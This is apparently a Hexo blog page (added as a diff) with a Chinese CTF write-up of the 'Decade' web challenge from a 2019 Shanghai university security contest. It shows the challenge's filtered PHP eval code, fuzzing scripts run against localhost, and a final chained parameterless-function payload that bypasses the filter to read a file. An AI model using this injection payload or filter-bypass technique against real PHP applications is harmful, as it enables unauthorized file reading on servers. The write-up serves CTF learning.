@@ -1,0 +1,829 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="WebDecade题目源码 1234567891011121314151617&amp;lt;?phphighlight_file(__FILE__);$code = $_GET[&apos;code&apos;];if (!empty($code)) &amp;#123;        if (&apos;;&apos; === preg_replace(&apos;/[a-z]+\((?R)?\)/&apos;, NULL, $code)) &amp;#123;">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019上海大学生网络安全大赛">
+<meta property="og:url" content="http://yoursite.com/2019/11/03/2019上海大学生网络安全大赛/index.html">
+<meta property="og:site_name" content="Glarcy">
+<meta property="og:description" content="WebDecade题目源码 1234567891011121314151617&amp;lt;?phphighlight_file(__FILE__);$code = $_GET[&apos;code&apos;];if (!empty($code)) &amp;#123;        if (&apos;;&apos; === preg_replace(&apos;/[a-z]+\((?R)?\)/&apos;, NULL, $code)) &amp;#123;">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/img/shanghai/s1.png">
+<meta property="og:image" content="http://yoursite.com/img/shanghai/2.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shanghai/1.png">
+<meta property="og:updated_time" content="2020-07-26T08:24:14.416Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019上海大学生网络安全大赛">
+<meta name="twitter:description" content="WebDecade题目源码 1234567891011121314151617&amp;lt;?phphighlight_file(__FILE__);$code = $_GET[&apos;code&apos;];if (!empty($code)) &amp;#123;        if (&apos;;&apos; === preg_replace(&apos;/[a-z]+\((?R)?\)/&apos;, NULL, $code)) &amp;#123;">
+<meta name="twitter:image" content="http://yoursite.com/img/shanghai/s1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/11/03/2019上海大学生网络安全大赛/">
+
+
+
+
+
+  <title>2019上海大学生网络安全大赛 | Glarcy</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Glarcy</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-首页">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-标签">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/03/2019上海大学生网络安全大赛/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Glarcy">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Glarcy">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2019上海大学生网络安全大赛</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-11-03T16:45:20+08:00">
+                2019-11-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="Decade"><a href="#Decade" class="headerlink" title="Decade"></a>Decade</h4><p>题目源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code = $_GET[<span class="string">'code'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($code)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $code)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">eval</span>($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"No way!!!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"No way!!!"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这题跟字节跳动那题差不多，不过比字节跳动那题限制的多一点，这里记录一下</p>
+<a id="more"></a>
+
+<p><code>/[a-z]+\((?R)?\)/</code>这个正则表达式的意思是仅支持无参函数，并且函数名只能为字母，但支持函数套用，如果最后只剩下<code>;</code>就会通过这个正则表达式</p>
+<p>第二个正则表达式是限制了这么多函数不能用，那还有什么函数能用呢？接下来就fuzz一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $len = count(get_defined_functions()[<span class="string">'internal'</span>]);</span><br><span class="line">    $i_need_func = <span class="keyword">array</span>();</span><br><span class="line">    $j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">'/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, get_defined_functions()[<span class="string">'internal'</span>][$i]))&#123;</span><br><span class="line">            <span class="keyword">if</span> (!strpos(get_defined_functions()[<span class="string">'internal'</span>][$i],<span class="string">'_'</span>))&#123;</span><br><span class="line">                $i_need_func[$j] = get_defined_functions()[<span class="string">'internal'</span>][$i];</span><br><span class="line">                $j++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现剩下307个可用函数，根据题目，我们可以知道flag在上层目录，因此需要使用chdir跳转，但是chdir只会返回bool值，我们需要找一个函数接受布尔值并且可以输出”.”</p>
+<p>我们先考虑如何读取当前目录下的文件</p>
+<p>在php里面读取文件的函数如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fgetc — 从文件指针中读取字符</span><br><span class="line">fgets — 从文件指针中读取一行</span><br><span class="line">fgetss — 从文件指针中读取一行并过滤掉 HTML 标记</span><br><span class="line">file_get_contents — 将整个文件读入一个字符串</span><br><span class="line">file — 把整个文件读入一个数组中</span><br><span class="line">fopen — 打开文件或者 URL</span><br><span class="line">fread — 读取文件（可安全用于二进制文件）</span><br><span class="line">readfile — 输出文件</span><br></pre></td></tr></table></figure>
+
+<p>在php里面关于文件目录操作的函数如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">basename( )  //返回路径中的文件名部分</span><br><span class="line">chdir()    //改变当前的目录</span><br><span class="line">dirname( ) //返回路径中的目录部分</span><br><span class="line">getcwd()    //返回当前工作目录</span><br><span class="line">pathinfo( ) //返回文件路径的信息</span><br><span class="line">opendir( ) //打开目录句柄</span><br><span class="line">readdir( ) //从目录句柄中读取条目，返回目录中下一个文件的文件名</span><br><span class="line">rewinddir( ) //重置目录句柄</span><br><span class="line">closedir( ) //关闭目录句柄</span><br><span class="line">mkdir( ) //新建目录</span><br><span class="line">rmdir( ) //删除指定的空目录</span><br><span class="line">scandir( ) //列出指定路径中的文件和目录</span><br></pre></td></tr></table></figure>
+
+<p>这里我们选择<code>scandir</code>，那么<code>.</code>怎么得到呢？<code>.</code>的ascii是46，我们可以通过chr(46)来得到<code>.</code>表示当前目录，接下来就要考虑怎么得到46了</p>
+<p>fuzz一下不需要输入参数就能得到返回的函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">str = <span class="string">"strcmp,strncmp,strcasecmp,strncasecmp,each,define,defined,date,idate,gmdate,checkdate,readgzfile,gzrewind,gzclose,gzeof,gzread,gzopen,gzpassthru,gzseek,gztell,gzwrite,gzputs,gzfile,gzcompress,gzuncompress,gzdeflate,gzinflate,gzencode,bcadd,bcsub,bcmul,bcdiv,bcmod,bcpow,bcscale,bccomp,bcpowmod,bzopen,bzread,bzwrite,bzflush,bzclose,bzerrno,bzerrstr,bzerror,bzcompress,jdtogregorian,jdtojulian,jdtojewish,jewishtojd,jdtofrench,frenchtojd,jddayofweek,unixtojd,jdtounix,imagearc,imageellipse,imagechar,imagecharup,imagecolorat,imagecolorallocate,imagecreatefromstring,imagecolorclosest,imagecolorclosesthwb,imagecolordeallocate,imagecolorresolve,imagecolorexact,imagecolorstotal,imagecolorsforindex,imagecopy,imagecopymerge,imagecopymergegray,imagecopyresized,imagecreate,imageistruecolor,imagefilledarc,imagefilledellipse,imagealphablending,imagesavealpha,imagecolorallocatealpha,imagecolorresolvealpha,imagecolorclosestalpha,imagecolorexactalpha,imagecopyresampled,imagerotate,imageflip,imagecrop,imagecropauto,imagescale,imageaffine,imageaffinematrixconcat,imagecreatefrompng,imagecreatefromjpeg,imagecreatefromwbmp,imagecreatefromxbm,imagecreatefromgd,imagecreatefromgd2,imagecreatefromgd2part,imagepng,imagejpeg,imagewbmp,imagegd,imagegd2,imagedestroy,imagegammacorrect,imagefill,imagefilledpolygon,imagefilledrectangle,imagefilltoborder,imageline,imagepolygon,imagerectangle,imagestring,imagestringup,imagesx,imagesy,imagedashedline,jpeg2wbmp,png2wbmp,image2wbmp,imagelayereffect,imagexbm,imagecolormatch,imagefilter,imageconvolution,hash,iconv,mbereg,mberegi,mbsplit,snmpwalk,snmprealwalk,snmpwalkoid,sleep,usleep,flush,wordwrap,htmlspecialchars,sha1,md5,crc32,iptcparse,iptcembed,phpversion,phpcredits,strspn,strcspn,strtok,strtoupper,strtolower,strpos,stripos,strrpos,strripos,strrev,hebrev,hebrevc,nl2br,stripslashes,stripcslashes,strstr,stristr,strrchr,strpbrk,strcoll,substr,ucfirst,lcfirst,ucwords,strtr,addslashes,addcslashes,rtrim,trim,ltrim,implode,join,soundex,levenshtein,chr,ord,chop,strchr,sscanf,fscanf,urlencode,rawurlencode,readlink,symlink,link,unlink,exec,system,escapeshellcmd,escapeshellarg,passthru,abs,ceil,floor,round,sin,cos,tan,asin,acos,atan,atanh,atan2,sinh,cosh,tanh,asinh,acosh,pow,hypot,deg2rad,rad2deg,fmod,ip2long,long2ip,putenv,uniqid,serialize,unserialize,header,checkdnsrr,floatval,doubleval,strval,boolval,pclose,popen,rewind,rmdir,umask,fclose,feof,fread,fopen,fpassthru,ftruncate,fstat,fseek,ftell,fflush,fwrite,fputs,mkdir,copy,tmpfile,file,fputcsv,flock,fnmatch,fsockopen,pfsockopen,pack,unpack,crypt,opendir,closedir,chdir,rewinddir,readdir,dir,scandir,glob,filegroup,fileinode,fileowner,fileperms,filesize,stat,lstat,chown,chgrp,lchown,lchgrp,chmod,touch,clearstatcache,diskfreespace,mail,ksort,krsort,asort,arsort,sort,rsort,usort,uasort,uksort,shuffle,end,prev,next,key,min,max,extract,compact,range,pos,sizeof,assert,ftok,virtual"</span></span><br><span class="line">func = str.split(<span class="string">','</span>)</span><br><span class="line">url = <span class="string">"http://localhost/code/code/code.php?code=%s"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> func:</span><br><span class="line">    test = <span class="string">"echo(%s());"</span> % i</span><br><span class="line">    url = <span class="string">"http://localhost/code/code/code.php?code=%s"</span> % test</span><br><span class="line">    res = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Warning"</span> <span class="keyword">in</span> res.content:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">"No way!!!"</span> <span class="keyword">in</span> res.content:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">"&lt;"</span> <span class="keyword">in</span> res.content:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">elif</span> len(res.content) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> i+<span class="string">": "</span>+res.content</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<p><img src="../../../../img/shanghai/s1.png" alt="s1"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">phpcredits — 打印 PHP 贡献者名单</span><br><span class="line">unixtojd: — 转变Unix时间戳为Julian Day计数</span><br><span class="line">phpversion: — 返回当前的PHP版本</span><br><span class="line">uniqid: — 基于以微秒计的当前时间，生成一个唯一的 ID</span><br><span class="line">umask: — 返回当前的 umask</span><br><span class="line">tmpfile: — 以读写（w+）模式建立一个具有唯一文件名的临时文件</span><br></pre></td></tr></table></figure>
+
+<p>fuzz一下只需要一个参数的函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">str = <span class="string">"strcmp,strncmp,strcasecmp,strncasecmp,each,define,defined,date,idate,gmdate,checkdate,readgzfile,gzrewind,gzclose,gzeof,gzread,gzopen,gzpassthru,gzseek,gztell,gzwrite,gzputs,gzfile,gzcompress,gzuncompress,gzdeflate,gzinflate,gzencode,bcadd,bcsub,bcmul,bcdiv,bcmod,bcpow,bcscale,bccomp,bcpowmod,bzopen,bzread,bzwrite,bzflush,bzclose,bzerrno,bzerrstr,bzerror,bzcompress,jdtogregorian,jdtojulian,jdtojewish,jewishtojd,jdtofrench,frenchtojd,jddayofweek,unixtojd,jdtounix,imagearc,imageellipse,imagechar,imagecharup,imagecolorat,imagecolorallocate,imagecreatefromstring,imagecolorclosest,imagecolorclosesthwb,imagecolordeallocate,imagecolorresolve,imagecolorexact,imagecolorstotal,imagecolorsforindex,imagecopy,imagecopymerge,imagecopymergegray,imagecopyresized,imagecreate,imageistruecolor,imagefilledarc,imagefilledellipse,imagealphablending,imagesavealpha,imagecolorallocatealpha,imagecolorresolvealpha,imagecolorclosestalpha,imagecolorexactalpha,imagecopyresampled,imagerotate,imageflip,imagecrop,imagecropauto,imagescale,imageaffine,imageaffinematrixconcat,imagecreatefrompng,imagecreatefromjpeg,imagecreatefromwbmp,imagecreatefromxbm,imagecreatefromgd,imagecreatefromgd2,imagecreatefromgd2part,imagepng,imagejpeg,imagewbmp,imagegd,imagegd2,imagedestroy,imagegammacorrect,imagefill,imagefilledpolygon,imagefilledrectangle,imagefilltoborder,imageline,imagepolygon,imagerectangle,imagestring,imagestringup,imagesx,imagesy,imagedashedline,jpeg2wbmp,png2wbmp,image2wbmp,imagelayereffect,imagexbm,imagecolormatch,imagefilter,imageconvolution,hash,iconv,mbereg,mberegi,mbsplit,snmpwalk,snmprealwalk,snmpwalkoid,sleep,usleep,flush,wordwrap,htmlspecialchars,sha1,md5,crc32,iptcparse,iptcembed,phpversion,phpcredits,strspn,strcspn,strtok,strtoupper,strtolower,strpos,stripos,strrpos,strripos,strrev,hebrev,hebrevc,nl2br,stripslashes,stripcslashes,strstr,stristr,strrchr,strpbrk,strcoll,substr,ucfirst,lcfirst,ucwords,strtr,addslashes,addcslashes,rtrim,trim,ltrim,implode,join,soundex,levenshtein,chr,ord,chop,strchr,sscanf,fscanf,urlencode,rawurlencode,readlink,symlink,link,unlink,exec,system,escapeshellcmd,escapeshellarg,passthru,abs,ceil,floor,round,sin,cos,tan,asin,acos,atan,atanh,atan2,sinh,cosh,tanh,asinh,acosh,pow,hypot,deg2rad,rad2deg,fmod,ip2long,long2ip,putenv,uniqid,serialize,unserialize,header,checkdnsrr,floatval,doubleval,strval,boolval,pclose,popen,rewind,rmdir,umask,fclose,feof,fread,fopen,fpassthru,ftruncate,fstat,fseek,ftell,fflush,fwrite,fputs,mkdir,copy,tmpfile,file,fputcsv,flock,fnmatch,fsockopen,pfsockopen,pack,unpack,crypt,opendir,closedir,chdir,rewinddir,readdir,dir,scandir,glob,filegroup,fileinode,fileowner,fileperms,filesize,stat,lstat,chown,chgrp,lchown,lchgrp,chmod,touch,clearstatcache,diskfreespace,mail,ksort,krsort,asort,arsort,sort,rsort,usort,uasort,uksort,shuffle,end,prev,next,key,min,max,extract,compact,range,pos,sizeof,assert,ftok,virtual"</span></span><br><span class="line">func = str.split(<span class="string">','</span>)</span><br><span class="line">url = <span class="string">"http://localhost/code/code/code.php?code=%s"</span></span><br><span class="line">arr = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> func:</span><br><span class="line">    test = <span class="string">"echo(%s());"</span> % i</span><br><span class="line">    url = <span class="string">"http://localhost/code/code/code.php?code=%s"</span> % test</span><br><span class="line">    res = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"1 parameter"</span> <span class="keyword">in</span> res.content:</span><br><span class="line">        arr.append(i)</span><br><span class="line"><span class="keyword">print</span> arr</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&apos;each&apos;, &apos;defined&apos;, &apos;date&apos;, &apos;idate&apos;, &apos;gmdate&apos;, &apos;readgzfile&apos;, &apos;gzrewind&apos;, &apos;gzclose&apos;, &apos;gzeof&apos;, &apos;gzpassthru&apos;, &apos;gztell&apos;, &apos;gzfile&apos;, &apos;gzcompress&apos;, &apos;gzuncompress&apos;, &apos;gzdeflate&apos;, &apos;gzinflate&apos;, &apos;gzencode&apos;, &apos;bcscale&apos;, &apos;bzread&apos;, &apos;bzflush&apos;, &apos;bzclose&apos;, &apos;bzerrno&apos;, &apos;bzerrstr&apos;, &apos;bzerror&apos;, &apos;bzcompress&apos;, &apos;jdtogregorian&apos;, &apos;jdtojulian&apos;, &apos;jdtojewish&apos;, &apos;jdtofrench&apos;, &apos;jddayofweek&apos;, &apos;jdtounix&apos;, &apos;imagecreatefromstring&apos;, &apos;imagecolorstotal&apos;, &apos;imageistruecolor&apos;, &apos;imagecropauto&apos;, &apos;imagecreatefrompng&apos;, &apos;imagecreatefromjpeg&apos;, &apos;imagecreatefromwbmp&apos;, &apos;imagecreatefromxbm&apos;, &apos;imagecreatefromgd&apos;, &apos;imagepng&apos;, &apos;imagejpeg&apos;, &apos;imagewbmp&apos;, &apos;imagegd&apos;, &apos;imagedestroy&apos;, &apos;imagesx&apos;, &apos;imagesy&apos;, &apos;sleep&apos;, &apos;usleep&apos;, &apos;wordwrap&apos;, &apos;htmlspecialchars&apos;, &apos;iptcparse&apos;, &apos;strtok&apos;, &apos;strtoupper&apos;, &apos;strtolower&apos;, &apos;strrev&apos;, &apos;hebrev&apos;, &apos;hebrevc&apos;, &apos;stripslashes&apos;, &apos;stripcslashes&apos;, &apos;ucfirst&apos;, &apos;lcfirst&apos;, &apos;ucwords&apos;, &apos;addslashes&apos;, &apos;rtrim&apos;, &apos;trim&apos;, &apos;ltrim&apos;, &apos;implode&apos;, &apos;join&apos;, &apos;soundex&apos;, &apos;ord&apos;, &apos;chop&apos;, &apos;urlencode&apos;, &apos;rawurlencode&apos;, &apos;readlink&apos;, &apos;unlink&apos;, &apos;exec&apos;, &apos;system&apos;, &apos;escapeshellcmd&apos;, &apos;escapeshellarg&apos;, &apos;passthru&apos;, &apos;abs&apos;, &apos;ceil&apos;, &apos;floor&apos;, &apos;round&apos;, &apos;sin&apos;, &apos;cos&apos;, &apos;tan&apos;, &apos;asin&apos;, &apos;acos&apos;, &apos;atan&apos;, &apos;atanh&apos;, &apos;sinh&apos;, &apos;cosh&apos;, &apos;tanh&apos;, &apos;asinh&apos;, &apos;acosh&apos;, &apos;putenv&apos;, &apos;serialize&apos;, &apos;unserialize&apos;, &apos;header&apos;, &apos;checkdnsrr&apos;, &apos;floatval&apos;, &apos;doubleval&apos;, &apos;strval&apos;, &apos;boolval&apos;, &apos;pclose&apos;, &apos;rewind&apos;, &apos;rmdir&apos;, &apos;fclose&apos;, &apos;feof&apos;, &apos;fpassthru&apos;, &apos;fstat&apos;, &apos;ftell&apos;, &apos;fflush&apos;, &apos;mkdir&apos;, &apos;file&apos;, &apos;fsockopen&apos;, &apos;pfsockopen&apos;, &apos;pack&apos;, &apos;crypt&apos;, &apos;opendir&apos;, &apos;chdir&apos;, &apos;dir&apos;, &apos;scandir&apos;, &apos;glob&apos;, &apos;filegroup&apos;, &apos;fileinode&apos;, &apos;fileowner&apos;, &apos;fileperms&apos;, &apos;filesize&apos;, &apos;stat&apos;, &apos;lstat&apos;, &apos;touch&apos;, &apos;diskfreespace&apos;, &apos;ksort&apos;, &apos;krsort&apos;, &apos;asort&apos;, &apos;arsort&apos;, &apos;sort&apos;, &apos;rsort&apos;, &apos;shuffle&apos;, &apos;end&apos;, &apos;prev&apos;, &apos;next&apos;, &apos;key&apos;, &apos;min&apos;, &apos;max&apos;, &apos;extract&apos;, &apos;compact&apos;, &apos;pos&apos;, &apos;sizeof&apos;, &apos;assert&apos;, &apos;virtual&apos;]</span><br></pre></td></tr></table></figure>
+
+<p>通过搜索与测试，<code>chr(ord(hebrevc(crypt(phpversion()))))</code>即<code>chr(ord(hebrevc(crypt(1))))</code>可以得到<code>.</code>和<code>$</code>两种结果，多试几次就可以比较容易得到<code>.</code>，于是直接采用这个方法，得到<code>.</code>之后，使用<code>scandir</code>和<code>next</code>可以得到<code>..</code></p>
+<p>在PHP中有一组函数是关于操作数组内部指针指向的函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">current() - 返回数组中的当前元素的值</span><br><span class="line">pos() - 函数返回数组中的当前元素的值。</span><br><span class="line">next() - 将内部指针指向数组中的下一个元素，并输出</span><br><span class="line">prev() - 将内部指针指向数组中的上一个元素，并输出</span><br><span class="line">reset() - 将内部指针指向数组中的第一个元素，并输出</span><br><span class="line">each() - 返回当前元素的键名和键值，并将内部指针向前移动</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../img/shanghai/2.jpg" alt="2"></p>
+<p>接下来使用<code>chdir</code>返回上一级目录，成功会返回1，因此这里重复第一步构造一个点，然后扫描当前目录，通过<code>end</code>函数获得文件名，使用<code>file</code>函数将整个文件读入数组再使用implode就可以读取文件内容了，最终payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(implode(file(end(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))))))));</span><br></pre></td></tr></table></figure>
+
+<p>更详细请参考：<a href="https://www.freebuf.com/column/221178.html" target="_blank" rel="noopener">https://www.freebuf.com/column/221178.html</a></p>
+<h4 id="Babyt5"><a href="#Babyt5" class="headerlink" title="Babyt5"></a>Babyt5</h4><p>安恒月赛题</p>
+<p><a href="https://www.jianshu.com/p/804d95f6d6fb" target="_blank" rel="noopener">https://www.jianshu.com/p/804d95f6d6fb</a></p>
